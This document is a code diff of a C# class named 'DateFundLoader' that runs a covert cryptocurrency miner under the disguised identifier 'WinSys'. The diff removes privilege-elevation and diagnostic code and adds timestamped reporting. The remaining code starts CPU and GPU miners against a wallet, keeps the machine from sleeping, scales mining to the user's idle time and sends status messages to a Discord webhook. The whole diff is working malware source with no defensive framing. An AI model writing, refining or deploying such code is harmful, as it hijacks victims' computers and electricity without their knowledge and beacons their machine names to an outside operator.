@@ -22,43 +22,12 @@ public class DateFundLoader {
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     static extern uint SetThreadExecutionState(uint esFlags);
 
-    [DllImport("advapi32.dll", SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-
-    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct LUID { public uint LowPart; public int HighPart; }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
-
-    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
-    private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
-    private const uint TOKEN_QUERY = 0x0008;
-
-    private const uint ES_CONTINUOUS = 0x80000000;
-    private const uint ES_SYSTEM_REQUIRED = 0x00000001;
-    private const uint ES_AWAYMODE_REQUIRED = 0x00000040;
-
     private const string IDENT = "WinSys";
     private const int IDLE_THRESHOLD_MS = 30000; 
 
-    private static int iterationCount = 0;
-    private static string lastError = "None";
-
     public static void StartMiner(string cpuPath, string gpuPath, string wallet) {
         try {
-            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
-            TryEnableHugePages(); 
+            SetThreadExecutionState(0x80000000 | 0x00000001 | 0x00000040);
             NotifyDiscord("Worker ON");
 
             Thread manager = new Thread(() => RunManager(cpuPath, gpuPath, wallet));
@@ -66,24 +35,6 @@ public class DateFundLoader {
             manager.Start();
 
             Thread.Sleep(Timeout.Infinite);
-        } catch (Exception ex) { 
-            NotifyDiscord("FATAL: " + ex.Message);
-        }
-    }
-
-    private static void TryEnableHugePages() {
-        try {
-            IntPtr tokenHandle;
-            if (OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle)) {
-                LUID luid;
-                if (LookupPrivilegeValue(null, "SeLockMemoryPrivilege", out luid)) {
-                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES {
-                        PrivilegeCount = 1,
-                        Privileges = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
-                    };
-                    AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
-                }
-            }
         } catch { }
     }
 
@@ -94,15 +45,7 @@ public class DateFundLoader {
 
         while (true) {
             try {
-                iterationCount++;
                 bool isIdle = GetIdleTime() > IDLE_THRESHOLD_MS;
-                
-                // Diagnostic Heartbeat (Every 15 minutes / 180 cycles)
-                if (iterationCount % 180 == 0) {
-                    bool cpuActive = cpuProc != null && !cpuProc.HasExited;
-                    NotifyDiscord(string.Format("[{0}] Status: OK | Pwr: {1} | Hash: {2}", Environment.MachineName, isIdle ? "100" : "45", cpuActive ? "TRUE" : "FALSE"));
-                }
-
                 string rawMachine = Environment.MachineName;
                 string machine = "";
                 foreach (char c in rawMachine) {
@@ -143,11 +86,8 @@ public class DateFundLoader {
                         try { gpuProc.PriorityClass = ProcessPriorityClass.AboveNormal; } catch { }
                     }
                 }
-                
                 wasIdle = isIdle;
-            } catch (Exception ex) { 
-                lastError = ex.Message;
-            }
+            } catch { }
             Thread.Sleep(5000);
         }
     }
@@ -158,9 +98,12 @@ public class DateFundLoader {
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
             ServicePointManager.CheckCertificateRevocationList = false;
 
+            string time = DateTime.Now.ToString("HH:mm:ss");
+            string payload = "{\"content\": \"`[" + time + "]` " + msg + "\"}";
+
             using (WebClient wc = new WebClient()) {
                 wc.Headers[HttpRequestHeader.ContentType] = "application/json";
-                wc.UploadString(webhookUrl, "{\"content\": \"" + msg + "\"}");
+                wc.UploadString(webhookUrl, payload);
             }
         } catch { }
     }
